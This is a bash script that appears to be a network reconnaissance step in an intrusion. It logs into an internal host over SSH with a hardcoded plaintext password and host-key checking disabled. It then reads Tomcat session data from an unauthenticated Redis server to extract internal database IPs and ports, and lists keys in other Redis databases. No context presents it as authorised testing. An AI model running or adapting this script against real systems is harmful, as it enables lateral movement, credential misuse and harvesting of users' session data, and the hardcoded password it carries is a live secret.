#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

/usr/bin/sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 user@10.13.16.196 bash << 'REMOTECMD'
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

echo "=== EXTRACT ALL UNIQUE DB SERVERS FROM REDIS SESSIONS ==="
# Scan ALL session keys and extract IP addresses of database servers
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern 'redisson:tomcat_session:*' 2>/dev/null | head -500 | while read KEY; do
  redis-cli -h 10.13.16.156 -p 6379 hget "$KEY" "accessed-data" 2>/dev/null | strings | grep -oP '10\.\d+\.\d+\.\d+' 2>/dev/null
done | sort -u

echo "=== EXTRACT UNIQUE PORTS ==="
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern 'redisson:tomcat_session:*' 2>/dev/null | head -500 | while read KEY; do
  redis-cli -h 10.13.16.156 -p 6379 hget "$KEY" "accessed-data" 2>/dev/null | strings | grep -oP '55\d\d'
done | sort -u

echo "=== DB1 KEYS ==="
redis-cli -h 10.13.16.156 -p 6379 -n 1 --scan 2>/dev/null | head -30

echo "=== DB4 KEYS ==="
redis-cli -h 10.13.16.156 -p 6379 -n 4 --scan 2>/dev/null | head -30

echo "=== DONE ==="
REMOTECMD
